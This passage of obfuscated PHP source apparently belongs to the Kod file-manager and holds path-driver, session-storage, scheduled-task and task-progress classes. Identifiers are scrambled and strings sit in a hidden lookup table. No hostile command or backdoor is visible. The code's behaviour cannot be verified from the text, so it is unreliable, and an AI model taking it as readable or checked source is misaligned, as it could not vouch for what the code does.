$¨«ìí²æ, $ö†˜ÓûÃ, $¾Ëı¡İ = false) { $Ùß ˆ„• =& $_SERVER[ˆö¿ÚÌ¼]; $ŞØïËÅú = $Ï·˜×´Ò; $úÇ›Î¸Å = IO::driverMake($Ï·˜×´Ò); if ($úÇ›Î¸Å->pathParse[$Ùß ˆ„•[1246]]) { $Ï·˜×´Ò = $úÇ›Î¸Å->pathParse[$Ùß ˆ„•[1246]]; } else { $Ï·˜×´Ò = $ŞØïËÅú; } $ÆŠ•ÈÑ = IO::copyMove($Î»˜ôŒ¢, $Ï·˜×´Ò, $¨«ìí²æ, $ö†˜ÓûÃ, $¾Ëı¡İ); $ÆŠ•ÈÑ = $this->getPathOuter($ÆŠ•ÈÑ); return $ÆŠ•ÈÑ; } public function pathThis($Å¢›Úëİ) { return get_path_this($this->pathParse[$_SERVER[ˆö¿ÚÌ¼][87]]); } public function pathFather($ÀÊ¿§îô) { return get_path_father($this->pathParse[$_SERVER[ˆö¿ÚÌ¼][87]]); } public function iconvSystem($ä»´‡ÅÇ) { return $ä»´‡ÅÇ; } protected function infoParse($à©Ù­ÍÀ, $ãÉ™“Â¸ = false) { $ÎŸœÚ°Ö =& $_SERVER[ˆö¿ÚÌ¼]; $Ëü“‹÷€ = $this->pathParse[$ÎŸœÚ°Ö[574]][$ÎŸœÚ°Ö[1271]] . $this->pathParse[$ÎŸœÚ°Ö[1264]]; if ($ãÉ™“Â¸) { $Öî¸‘Àå = IO::infoWithChildren($Ëü“‹÷€); } else { $Öî¸‘Àå = IO::info($Ëü“‹÷€); } $¬ö¬ë = $this->pathParse[$ÎŸœÚ°Ö[574]]; return Action($ÎŸœÚ°Ö[1442])->_shareItemeParse($Öî¸‘Àå, $¬ö¬ë); } public function listAll($ğÙí£×ˆ) { $Ïí«Äª¾ =& $_SERVER[ˆö¿ÚÌ¼]; $˜µ‡ÄóÔ = IO::listAll($ğÙí£×ˆ); $ë„çš’ú = rtrim($this->pathParse[$Ïí«Äª¾[574]][$Ïí«Äª¾[1271]], $Ïí«Äª¾[8]); foreach ($˜µ‡ÄóÔ as &$–Ûäíô¹) { $–Ûäíô¹[$Ïí«Äª¾[87]] = $this->pathDriver . $Ïí«Äª¾[8] . ltrim(substr($–Ûäíô¹[$Ïí«Äª¾[87]], strlen($ë„çš’ú)), $Ïí«Äª¾[8]); } unset($–Ûäíô¹); return $˜µ‡ÄóÔ; } public function listAllSimple($Œş´¡Ù¦, $‡º‡ş„Õ = false) { $ĞØÈÎ× =& $_SERVER[ˆö¿ÚÌ¼]; $°‘ñÎş¿ = $this->listAll($Œş´¡Ù¦); $ëÒíñŞß = $this->pathParse[$ĞØÈÎ×[507]]; if (trim($ëÒíñŞß, $ĞØÈÎ×[8]) == trim(get_path_father($ëÒíñŞß), $ĞØÈÎ×[8])) { $‡º‡ş„Õ = !0; } return IO::init($ĞØÈÎ×[12])->listAllSimpleMake($°‘ñÎş¿, $ëÒíñŞß, $‡º‡ş„Õ); } public function getPathOuter($¤òÇ¯ø) { $ÚÍß»ç =& $_SERVER[ˆö¿ÚÌ¼]; $ğğİ¿½‡ = KodIO::parse($¤òÇ¯ø); if ($ğğİ¿½‡[$ÚÍß»ç[33]] == KodIO::KOD_SHARE_ITEM) { return $ğğİ¿½‡[$ÚÍß»ç[87]]; } $÷¢¶ªùñ = KodIO::clear($¤òÇ¯ø); $×¯Â¦Ï¯ = KodIO::clear($this->pathParse[$ÚÍß»ç[574]][$ÚÍß»ç[1271]]); $®Æ™”£Ì = substr($÷¢¶ªùñ, strlen($×¯Â¦Ï¯)); if (substr($÷¢¶ªùñ, 0, strlen($×¯Â¦Ï¯)) != $×¯Â¦Ï¯) { return !1; } return $this->pathParse[$ÚÍß»ç[1265]] . $ÚÍß»ç[8] . ltrim($®Æ™”£Ì, $ÚÍß»ç[8]); } public function getType() { $”¯Ã¬ =& $_SERVER[ˆö¿ÚÌ¼]; $ÊÍ¬Ğ¡µ = str_replace($”¯Ã¬[77], $”¯Ã¬[12], get_class($this)); return strtolower($ÊÍ¬Ğ¡µ); } public function isOsDriver($„å”§Œ) { return IO::isOsDriver($„å”§Œ); } public function info($üÓÏ¥ÍÔ) { return $this->infoParse($üÓÏ¥ÍÔ); } public function infoAuth($´‘‡ñïÂ) { return $this->infoParse($´‘‡ñïÂ); } public function infoWithChildren($·™ú©í‘) { return $this->infoParse($·™ú©í‘, !0); } public function infoFull($½ŒÊ¶ü¶) { return $this->infoParse($½ŒÊ¶ü¶); } } goto cÑì‡±‘ã; eĞÇÛšƒ²Ä: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $‘«»šüò =& $_SERVER[ˆö¿ÚÌ¼]; static $½ò·«û = false; if ($½ò·«û) { return $½ò·«û; } $”¤Ûêµ¿ = $GLOBALS[$‘«»šüò[6]][$‘«»šüò[427]]; self::$sessionTime = $”¤Ûêµ¿[$‘«»šüò[1730]]; $Ø¡µşº… = isset($GLOBALS[$‘«»šüò[1731]]) ? $GLOBALS[$‘«»šüò[1731]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Ø¡µşº…)) { self::$sessionSign = Cookie::get($Ø¡µşº…); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($Ø¡µşº…, self::$sessionSign, self::$sessionTime); $…ƒ§¢Ñ˜ = $”¤Ûêµ¿[$‘«»šüò[1732]]; $ã„“Éû = $”¤Ûêµ¿[$…ƒ§¢Ñ˜]; $åî§ß„Â = $”¤Ûêµ¿[$‘«»šüò[918]]; switch ($…ƒ§¢Ñ˜) { case $‘«»šüò[21]: self::$handle = Model($‘«»šüò[919]); break; case $‘«»šüò[920]: self::$handle = new CacheRedis($ã„“Éû, $åî§ß„Â); break; case $‘«»šüò[921]: self::$handle = new CacheMemcached($ã„“Éû, $åî§ß„Â); break; case $‘«»šüò[233]: $ã„“Éû[$‘«»šüò[87]] = $ã„“Éû[$‘«»šüò[87]] . $‘«»šüò[1733]; self::$handle = new CacheFile($ã„“Éû, $åî§ß„Â); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $½ò·«û = new self(); return $½ò·«û; } public static function getBySign($¨‹ıÛ€¾) { $¢ºö‡ù° = self::$handle->get($¨‹ıÛ€¾); $¢ºö‡ù° = unserialize($¢ºö‡ù°); return is_array($¢ºö‡ù°) ? $¢ºö‡ù° : array(); } public static function setBySign($ˆŞ“ù€•, $İ¼‚ëË„) { CacheLock::lock($ˆŞ“ù€•); self::$handle->set($ˆŞ“ù€•, serialize($İ¼‚ëË„), self::$sessionTime); CacheLock::unlock($ˆŞ“ù€•); } public static function sign($ü†£†€Å = false) { if ($ü†£†€Å) { self::$sessionSign = $ü†£†€Å; } self::init(); return self::$sessionSign; } public static function set($Ú›Ùé•Ğ, $Š²çª§Œ = false) { self::init(); if (is_array($Ú›Ùé•Ğ)) { foreach ($Ú›Ùé•Ğ as $§éñ¯Èè => $³óÚâÁ¦) { array_set_value(self::$data, $§éñ¯Èè, $³óÚâÁ¦); } } else { array_set_value(self::$data, $Ú›Ùé•Ğ, $Š²çª§Œ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($©¨£æòÆ = false) { self::init(); if (!$©¨£æòÆ) { return self::$data; } return array_get_value(self::$data, $©¨£æòÆ); } public static function remove($œ°€â‚) { self::init(); unset(self::$data[$œ°€â‚]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ˆö¿ÚÌ¼][924])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $²Ÿ³æ¦ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::valueGet($²Ÿ³æ¦[835]) != $²Ÿ³æ¦[91]) { return; } if (self::valueGet($²Ÿ³æ¦[1734]) == $²Ÿ³æ¦[91]) { $ µÈˆ† = self::valueGet($²Ÿ³æ¦[1735]); if (time() - $ µÈˆ† > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($²Ÿ³æ¦[1734], $²Ÿ³æ¦[91]); self::log($²Ÿ³æ¦[1736] . ACTION . $²Ÿ³æ¦[1737]); Hook::bind($²Ÿ³æ¦[1738], $²Ÿ³æ¦[1739]); $Ş¨ÙÊ†ö = 0; while (!0) { self::cacheClear(); if (self::valueGet($²Ÿ³æ¦[835]) != $²Ÿ³æ¦[91]) { self::valueSet($²Ÿ³æ¦[1734], $²Ÿ³æ¦[231]); self::log($²Ÿ³æ¦[1740]); die; } $«á¨°ó’ = time(); if ($«á¨°ó’ - $Ş¨ÙÊ†ö >= 60) { self::valueSet(array($²Ÿ³æ¦[1734] => $²Ÿ³æ¦[91], $²Ÿ³æ¦[1735] => $«á¨°ó’)); $Ş¨ÙÊ†ö = $«á¨°ó’; } if (!file_exists(USER_SYSTEM . $²Ÿ³æ¦[1741])) { self::valueSet(array($²Ÿ³æ¦[1734] => $²Ÿ³æ¦[231], $²Ÿ³æ¦[835] => $²Ÿ³æ¦[231])); self::log($²Ÿ³æ¦[1742]); die; } $ÄÚ¦¹İá = file_get_contents(BASIC_PATH . $²Ÿ³æ¦[1743]); $¾ú®¥¼Ä = KOD_VERSION . $²Ÿ³æ¦[10] . KOD_VERSION_BUILD; $õ•—È§ = match_text($ÄÚ¦¹İá, $²Ÿ³æ¦[1744]) . $²Ÿ³æ¦[10] . match_text($ÄÚ¦¹İá, $²Ÿ³æ¦[1745]); if ($õ•—È§ != $¾ú®¥¼Ä) { self::restart(); self::log("\163\x74\157\160\x65\x64\56\x5b\166\145\x72\x73\x69\x6f\156\x20\165\x70\144\141\x74\145\73{$versionNow}\x20\75\x3e\40{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ıõ…Îøõ =& $_SERVER[ˆö¿ÚÌ¼]; http_close(); $GLOBALS[$ıõ…Îøõ[1746]] = 1; $_SERVER[$ıõ…Îøõ[1747]] = $ıõ…Îøõ[1748]; $_COOKIE = array(); $GLOBALS[$ıõ…Îøõ[1749]] = 1; $GLOBALS[$ıõ…Îøõ[1750]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÄÇö£¯ï =& $_SERVER[ˆö¿ÚÌ¼]; http_close(); self::valueSet($ÄÇö£¯ï[835], $ÄÇö£¯ï[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÄÇö£¯ï[1734] => $ÄÇö£¯ï[231], $ÄÇö£¯ï[835] => $ÄÇö£¯ï[91])); self::log($ÄÇö£¯ï[1751]); } public static function taskSwitch() { $ÁõÃ¼¶÷ =& $_SERVER[ˆö¿ÚÌ¼]; $šŸÒíÅ = self::valueGet($ÁõÃ¼¶÷[835]) == $ÁõÃ¼¶÷[91] ? $ÁõÃ¼¶÷[231] : $ÁõÃ¼¶÷[91]; self::valueSet($ÁõÃ¼¶÷[835], $šŸÒíÅ); } public static function shutdownEvent() { $ŞÍ‰ÒĞ =& $_SERVER[ˆö¿ÚÌ¼]; self::valueSet($ŞÍ‰ÒĞ[1734], $ŞÍ‰ÒĞ[231]); self::log($ŞÍ‰ÒĞ[1752]); } public static function config($ÜÀÑêó, $æ©»·î) { self::valueSet($_SERVER[ˆö¿ÚÌ¼][835], $ÜÀÑêó); } private static function taskRunAll() { $‘ğÜÏ™ê =& $_SERVER[ˆö¿ÚÌ¼]; $¿“ßÉĞ÷ = timeFloat(); $á¦©àŸº = Model($‘ğÜÏ™ê[1753])->listData(); $ï€ùª÷Æ = count($á¦©àŸº); for ($ïë¨Ì„Ñ = 0; $ïë¨Ì„Ñ < $ï€ùª÷Æ; $ïë¨Ì„Ñ++) { $ş‹Ó£…­ = $á¦©àŸº[$ïë¨Ì„Ñ]; if (!$ş‹Ó£…­[$‘ğÜÏ™ê[478]] || $ş‹Ó£…­[$‘ğÜÏ™ê[1754]] != $‘ğÜÏ™ê[91]) { continue; } if (!self::taskTimeCheck($ş‹Ó£…­)) { continue; } self::taskRun($ş‹Ó£…­); } Hook::trigger($‘ğÜÏ™ê[1755]); self::taskQueueRun($¿“ßÉĞ÷); } private static function taskQueueRun($¹ï”×ÚÄ) { $ë¢İÕ¬ = 10; while (!0) { $¥õ™£Îî = TaskQueue::run(); if ($¥õ™£Îî === !1) { break; } if (timeFloat() - $¹ï”×ÚÄ >= $ë¢İÕ¬) { break; } } } private static function taskTimeCheck($ŸìÖ‚ƒ) { $ç†¬°¯ =& $_SERVER[ˆö¿ÚÌ¼]; $€Ï´½ÁÍ = json_decode($ŸìÖ‚ƒ[$ç†¬°¯[207]], !0); $‹³±•Æí = intval($ŸìÖ‚ƒ[$ç†¬°¯[1735]]); $ĞÏ¾Úï· = strtotime($ç†¬°¯[1756] . $€Ï´½ÁÍ[$ç†¬°¯[1757]] . $ç†¬°¯[1758]) - strtotime($ç†¬°¯[1759]); $óšõàâ = time() - strtotime(date($ç†¬°¯[1760]) . $ç†¬°¯[1761]); $ ÆÖ×ƒ = $óšõàâ >= $ĞÏ¾Úï· && $óšõàâ <= $ĞÏ¾Úï· + 3600; switch ($€Ï´½ÁÍ[$ç†¬°¯[33]]) { case $ç†¬°¯[1762]: if (time() - $‹³±•Æí < 3600 * 24 * 30) { return !1; } if ($€Ï´½ÁÍ[$ç†¬°¯[1762]] == date($ç†¬°¯[1763]) && $ ÆÖ×ƒ) { return !0; } break; case $ç†¬°¯[1764]: if (time() - $‹³±•Æí < 3600 * 24 * 7) { return !1; } $ˆŒ÷¦Åù = date($ç†¬°¯[1765]) == 0 ? 7 : date($ç†¬°¯[1765]); if ($€Ï´½ÁÍ[$ç†¬°¯[1764]] == $ˆŒ÷¦Åù && $ ÆÖ×ƒ) { return !0; } break; case $ç†¬°¯[1757]: if (time() - $‹³±•Æí < 3600 * 24) { return !1; } if ($ ÆÖ×ƒ) { return !0; } break; case $ç†¬°¯[1766]: if (time() - $‹³±•Æí >= floatval($€Ï´½ÁÍ[$ç†¬°¯[1766]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $…±ûŸ¼ =& $_SERVER[ˆö¿ÚÌ¼]; static $®‘®µÑ¸ = 0; $’ß“«òÄ = 300; if (!$®‘®µÑ¸) { $®‘®µÑ¸ = time(); } if (time() - $®‘®µÑ¸ < $’ß“«òÄ) { return; } $®‘®µÑ¸ = time(); $øúƒÆÊ¬ = Model($…±ûŸ¼[591])->db($…±ûŸ¼[12]); if ($øúƒÆÊ¬) { $øúƒÆÊ¬->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($…±ûŸ¼[1767], $…±ûŸ¼[1768]); die; } } public static function taskRun($•—‹â„) { $‘¨ñŞˆ =& $_SERVER[ˆö¿ÚÌ¼]; self::log($‘¨ñŞˆ[1769] . $•—‹â„[$‘¨ñŞˆ[478]] . $‘¨ñŞˆ[1770] . $•—‹â„[$‘¨ñŞˆ[32]] . $‘¨ñŞˆ[1771] . $•—‹â„[$‘¨ñŞˆ[1772]]); Model($‘¨ñŞˆ[1753])->run($•—‹â„[$‘¨ñŞˆ[478]]); $Äİ‚½Ù‹ = timeFloat(); $üÑ–ïÉ = $‘¨ñŞˆ[12]; switch ($•—‹â„[$‘¨ñŞˆ[33]]) { case $‘¨ñŞˆ[385]: $î‰›ğî = url_request($•—‹â„[$‘¨ñŞˆ[1772]], $‘¨ñŞˆ[1510], !1, !1, !1, !1, 10); if ($î‰›ğî[$‘¨ñŞˆ[835]]) { $üÑ–ïÉ = strlen($î‰›ğî[$‘¨ñŞˆ[1301]]); } break; case $‘¨ñŞˆ[1773]: $üÑ–ïÉ = Hook::apply($•—‹â„[$‘¨ñŞˆ[1772]]); default: break; } Model($‘¨ñŞˆ[1774])->add(array($‘¨ñŞˆ[1775] => $‘¨ñŞˆ[12], $‘¨ñŞˆ[1776] => $‘¨ñŞˆ[231], $‘¨ñŞˆ[33] => $‘¨ñŞˆ[1777] . $•—‹â„[$‘¨ñŞˆ[478]], $‘¨ñŞˆ[1778] => json_encode(array($‘¨ñŞˆ[32] => $•—‹â„[$‘¨ñŞˆ[32]], $‘¨ñŞˆ[1779] => timeFloat() - $Äİ‚½Ù‹, $‘¨ñŞˆ[371] => $üÑ–ïÉ)))); $’£Ñ–ïœ = $üÑ–ïÉ ? $‘¨ñŞˆ[1780] . $üÑ–ïÉ : $‘¨ñŞˆ[12]; self::log($‘¨ñŞˆ[1781] . $•—‹â„[$‘¨ñŞˆ[478]] . $‘¨ñŞˆ[178] . $’£Ñ–ïœ); return !0; } public static function valueGet($áş×ìê) { $Ò³™ö¤» =& $_SERVER[ˆö¿ÚÌ¼]; $ô¦œœ‡» = $Ò³™ö¤»[1782]; $ÒôùùØ = Model($Ò³™ö¤»[520])->get($áş×ìê, $ô¦œœ‡»); if (is_null($ÒôùùØ)) { Model($Ò³™ö¤»[520])->set($Ò³™ö¤»[835], $Ò³™ö¤»[91], $ô¦œœ‡»); Model($Ò³™ö¤»[520])->set($Ò³™ö¤»[1734], $Ò³™ö¤»[231], $ô¦œœ‡»); $ÒôùùØ = Model($Ò³™ö¤»[520])->get($áş×ìê, $ô¦œœ‡»); } return $ÒôùùØ; } private static function valueSet($·óı¯Ì‹, $ÓØ‰Š»Õ = false) { $¼ùø“ê =& $_SERVER[ˆö¿ÚÌ¼]; $„Àû´ÀÂ = $¼ùø“ê[1783]; CacheLock::lock($„Àû´ÀÂ); $±œÉ ª‰ = Model($¼ùø“ê[520])->set($·óı¯Ì‹, $ÓØ‰Š»Õ, $¼ùø“ê[1782]); CacheLock::unlock($„Àû´ÀÂ); return $±œÉ ª‰; } protected static function log($ºË÷×¹÷) { write_log($ºË÷×¹÷, $_SERVER[ˆö¿ÚÌ¼][1768]); } private static function cacheClear() { $ –®¦î’ =& $_SERVER[ˆö¿ÚÌ¼]; Cache::clearMemory(Model($ –®¦î’[520])->cacheKey($ –®¦î’[1782])); Cache::clearMemory(Model($ –®¦î’[520])->cacheKey($ –®¦î’[1784])); Model($ –®¦î’[1753])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\162\165\x6e\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ç´‚¡˜–, $¹Úú‘Ÿ¤ = '', $›úü®ş¸ = 0, $îå²ÀÏà = '') { $òî–Œí‹ =& $_SERVER[ˆö¿ÚÌ¼]; if (self::get($ç´‚¡˜–)) { return; } $this->task = array($òî–Œí‹[478] => $ç´‚¡˜–, $òî–Œí‹[1785] => USER_ID, $òî–Œí‹[1673] => $îå²ÀÏà, $òî–Œí‹[538] => $òî–Œí‹[12], $òî–Œí‹[33] => $¹Úú‘Ÿ¤, $òî–Œí‹[1156] => $òî–Œí‹[12], $òî–Œí‹[1154] => $›úü®ş¸, $òî–Œí‹[1786] => 0, $òî–Œí‹[1787] => 0, $òî–Œí‹[1788] => 0, $òî–Œí‹[1789] => timeFloat(), $òî–Œí‹[1790] => 0, $òî–Œí‹[1791] => 0, $òî–Œí‹[1792] => 0, $òî–Œí‹[1793] => 0, $òî–Œí‹[835] => $òî–Œí‹[1734]); $GLOBALS[$òî–Œí‹[1794]] = 1; Hook::bind($òî–Œí‹[1738], array($this, $òî–Œí‹[1795])); Hook::bind($òî–Œí‹[1796], array($this, $òî–Œí‹[1797])); $this->startAfter(); Hook::trigger($òî–Œí‹[1798], $this->task); $this->task[$òî–Œí‹[1791]] = timeFloat(); } public function end($«ËÆÈ±± = '') { $ŸŸüƒÀ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ŸŸüƒÀ[1791]]) { self::valueSet($this->task[$ŸŸüƒÀ[478]], !1); } $this->isEnd = !0; if ($«ËÆÈ±±) { $this->task[$ŸŸüƒÀ[538]] = $«ËÆÈ±±; } self::log($ŸŸüƒÀ[1799] . $this->task[$ŸŸüƒÀ[478]] . $ŸŸüƒÀ[1800] . sprintf($ŸŸüƒÀ[942], timeFloat() - $this->task[$ŸŸüƒÀ[1789]]) . $ŸŸüƒÀ[1801]); Hook::unbind($ŸŸüƒÀ[1738], array($this, $ŸŸüƒÀ[1795])); Hook::unbind($ŸŸüƒÀ[1796], array($this, $ŸŸüƒÀ[1797])); $this->endAfter(); $ëä‘æœ = $this->task; $this->task = !1; Hook::trigger($ŸŸüƒÀ[1802], $ëä‘æœ); } public function update($âóøª·· = 0, $ı×Úöú÷ = false) { $Ø¶ë±³Ô =& $_SERVER[ˆö¿ÚÌ¼]; $›²ÜÏôƒ =& $this->task; if (!$›²ÜÏôƒ) { return; } $›²ÜÏôƒ[$Ø¶ë±³Ô[1786]] += $âóøª··; $›²ÜÏôƒ[$Ø¶ë±³Ô[1790]] = timeFloat(); if ($›²ÜÏôƒ[$Ø¶ë±³Ô[1154]]) { if ($›²ÜÏôƒ[$Ø¶ë±³Ô[1154]] < $›²ÜÏôƒ[$Ø¶ë±³Ô[1786]]) { $›²ÜÏôƒ[$Ø¶ë±³Ô[1154]] = $›²ÜÏôƒ[$Ø¶ë±³Ô[1786]]; } $Î¯å®±Ğ = timeFloat() - $›²ÜÏôƒ[$Ø¶ë±³Ô[1789]] - $›²ÜÏôƒ[$Ø¶ë±³Ô[1792]]; if ($Î¯å®±Ğ <= 0) { $Î¯å®±Ğ = 0.001; } $›²ÜÏôƒ[$Ø¶ë±³Ô[1787]] = $›²ÜÏôƒ[$Ø¶ë±³Ô[1786]] / $›²ÜÏôƒ[$Ø¶ë±³Ô[1154]]; $›²ÜÏôƒ[$Ø¶ë±³Ô[1788]] = $›²ÜÏôƒ[$Ø¶ë±³Ô[1786]] / $Î¯å®±Ğ; if ($›²ÜÏôƒ[$Ø¶ë±³Ô[1787]] > 0) { $›²ÜÏôƒ[$Ø¶ë±³Ô[1793]] = $Î¯å®±Ğ * (1 - $›²ÜÏôƒ[$Ø¶ë±³Ô[1787]]) / $›²ÜÏôƒ[$Ø¶ë±³Ô[1787]]; } $›²ÜÏôƒ[$Ø¶ë±³Ô[1793]] = $›²ÜÏôƒ[$Ø¶ë±³Ô[1793]] <= 0 ? 0 : $›²ÜÏôƒ[$Ø¶ë±³Ô[1793]]; } $this->updateAfter(); $øÃ¹çëï = 0.2; if (timeFloat() - $›²ÜÏôƒ[$Ø¶ë±³Ô[1791]] < $øÃ¹çëï && !$ı×Úöú÷) { return; } $£ıœ¬ò = self::get($›²ÜÏôƒ[$Ø¶ë±³Ô[478]]); $€şÈÖ‘¸ = $£ıœ¬ò[$Ø¶ë±³Ô[835]]; if ($€şÈÖ‘¸ == self::STATYS_KILL) { $‡âáŒëâ = array($Ø¶ë±³Ô[1803] => LNG($Ø¶ë±³Ô[1804]), $Ø¶ë±³Ô[1311] => !1); Cache::set($Ø¶ë±³Ô[1805] . $this->task[$Ø¶ë±³Ô[478]], $‡âáŒëâ, 30); $this->onKill(); $this->end(); die; } else { if ($€şÈÖ‘¸ == self::STATYS_STOP) { $™¾ìºª‹ = 2; $£ıœ¬ò[$Ø¶ë±³Ô[1792]] += $™¾ìºª‹; self::valueSet($›²ÜÏôƒ[$Ø¶ë±³Ô[478]], $£ıœ¬ò); sleep($™¾ìºª‹); $this->update(); return; } } $›²ÜÏôƒ[$Ø¶ë±³Ô[835]] = $€şÈÖ‘¸ ? $€şÈÖ‘¸ : $›²ÜÏôƒ[$Ø¶ë±³Ô[835]]; $›²ÜÏôƒ[$Ø¶ë±³Ô[1792]] = $£ıœ¬ò[$Ø¶ë±³Ô[1792]] ? $£ıœ¬ò[$Ø¶ë±³Ô[1792]] : 0; $›²ÜÏôƒ[$Ø¶ë±³Ô[1791]] = timeFloat(); Hook::trigger($Ø¶ë±³Ô[1806], $›²ÜÏôƒ); self::valueSet($›²ÜÏôƒ[$Ø¶ë±³Ô[478]], $›²ÜÏôƒ); } public function onKillSet($êÆ¿ßÆ, $öæ©Á×¸ = array()) { $this->onKillCall = array($êÆ¿ßÆ, $öæ©Á×¸); } public function onKill() { $¢ÜÉÍÔ =& $_SERVER[ˆö¿ÚÌ¼]; self::log($¢ÜÉÍÔ[1799] . $this->task[$¢ÜÉÍÔ[478]] . $¢ÜÉÍÔ[1807]); Hook::trigger($¢ÜÉÍÔ[1808], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($´Ç¥—×¯) { $ÀŒÈĞ»ú =& $_SERVER[ˆö¿ÚÌ¼]; Cache::set($ÀŒÈĞ»ú[1805] . $this->task[$ÀŒÈĞ»ú[478]], $´Ç¥—×¯, 60); if (!is_array($´Ç¥—×¯) || !$´Ç¥—×¯[$ÀŒÈĞ»ú[1311]]) { self::log($ÀŒÈĞ»ú[1809] . json_encode($´Ç¥—×¯)); } return $´Ç¥—×¯; } public static function get($ÆÍËâ½) { $ŞÌ†»ö‹ =& $_SERVER[ˆö¿ÚÌ¼]; $¹·«Œğá = self::valueGet($ÆÍËâ½); if (is_array($¹·«Œğá) && $¹·«Œğá[$ŞÌ†»ö‹[1810]]) { $×¿”Öû¼ = ActionApply($¹·«Œğá[$ŞÌ†»ö‹[1810]], array($¹·«Œğá)); $¹·«Œğá = is_array($×¿”Öû¼) ? $×¿”Öû¼ : $¹·«Œğá; } return $¹·«Œğá; } public static function listData() { $×Â›Âù‹ = self::valueGet(); return array_sort_by($×Â›Âù‹, $_SERVER[ˆö¿ÚÌ¼][1789], !0); } public static function kill($„ÜÀø””) { return self::changeStatus($„ÜÀø””, self::STATYS_KILL); } public static function stop($Ú“óñô¨) { return self::changeStatus($Ú“óñô¨, self::STATYS_STOP); } public static function restart($óÀÚ°ßô) { return self::changeStatus($óÀÚ°ßô, self::STATYS_RUNNING); } public static function killAll() { $ÔÛ¥ÉÇ© =& $_SERVER[ˆö¿ÚÌ¼]; $»²âÓÀ« = self::listData(); foreach ($»²âÓÀ« as $†•†É‹ú) { self::kill($†•†É‹ú[$ÔÛ¥ÉÇ©[478]]); } sleep(2); foreach ($»²âÓÀ« as $†•†É‹ú) { self::valueSet($†•†É‹ú[$ÔÛ¥ÉÇ©[478]], !1); } } private static function changeStatus($Ä‹˜¼©…, $«å©ƒ½) { $×ƒÀ¥¦Ì =& $_SERVER[ˆö¿ÚÌ¼]; $Ñü©—¼ = self::valueGet($Ä‹˜¼©…); if (!$Ñü©—¼) { return !1; } $Ñü©—¼[$×ƒÀ¥¦Ì[835]] = $«å©ƒ½; self::valueSet($Ä‹˜¼©…, $Ñü©—¼); self::log($×ƒÀ¥¦Ì[1811] . $Ñü©—¼[$×ƒÀ¥¦Ì[478]] . $×ƒÀ¥¦Ì[1812] . $«å©ƒ½); return !0; } public static function valueGet($ÊÀ¾ğ˜« = false) { $„×ãƒŸ =& $_SERVER[ˆö¿ÚÌ¼]; if ($ÊÀ¾ğ˜«) { $»„†Ù€¾ = Model($„×ãƒŸ[532])->where(array($„×ãƒŸ[97] => $ÊÀ¾ğ˜«, $„×ãƒŸ[33] => $„×ãƒŸ[1163]))->find(); return $»„†Ù€¾ ? json_decode($»„†Ù€¾[$„×ãƒŸ[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($¾‚â²³š = false) { $®š¸éÎ =& $_SERVER[ˆö¿ÚÌ¼]; $¼Ù•‚ÜÖ = array($®š¸éÎ[33] => $®š¸éÎ[1163]); if ($¾‚â²³š) { $¼Ù•‚ÜÖ[$®š¸éÎ[1785]] = $¾‚â²³š; } $®‹á¼¬× = Model($®š¸éÎ[532])->where($¼Ù•‚ÜÖ)->select(); $®‹á¼¬× = $®‹á¼¬× ? $®‹á¼¬× : array(); foreach ($®‹á¼¬× as $—™ñúÓ => $‰˜ì¸ˆä) { $®‹á¼¬×[$—™ñúÓ] = json_decode($‰˜ì¸ˆä[$®š¸éÎ[453]], !0); } return $®‹á¼¬×; } public static function valueSet($§´Àƒõ„, $Š…´´Ò) { $Ä¬²©ÛÂ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$Š…´´Ò) { return Model($Ä¬²©ÛÂ[532])->where(array($Ä¬²©ÛÂ[97] => $§´Àƒõ„, $Ä¬²©ÛÂ[33] => $Ä¬²©ÛÂ[1163]))->delete(); } $…‡¾†¤Õ = json_encode($Š…´´Ò); if (!$…‡¾†¤Õ) { ob_start(); var_dump($Š…´´Ò); $ÓÖï¥¡Å = ob_get_clean(); self::log($Ä¬²©ÛÂ[1813] . json_encode_force($ÓÖï¥¡Å)); } if (!$§´Àƒõ„ || !$Š…´´Ò[$Ä¬²©ÛÂ[478]]) { return !1; } $ß¦¢“õÎ = array($Ä¬²©ÛÂ[33] => $Ä¬²©ÛÂ[1163], $Ä¬²©ÛÂ[1785] => USER_ID, $Ä¬²©ÛÂ[97] => $§´Àƒõ„, $Ä¬²©ÛÂ[453] => $…‡¾†¤Õ); $ß…©ßµ = $Ä¬²©ÛÂ[1814]; CacheLock::lock($ß…©ßµ); Model($Ä¬²©ÛÂ[532])->add($ß¦¢“õÎ, array(), !0); CacheLock::unlock($ß…©ßµ); } public static function log($ûªÓñäÎ) { if (!GLOBAL_DEBUG) { return; } write_log($ûªÓñäÎ, $_SERVER[ˆö¿ÚÌ¼][1815]); } } goto EóÀ³Ğêë; Aß¾‹³å¾Á: 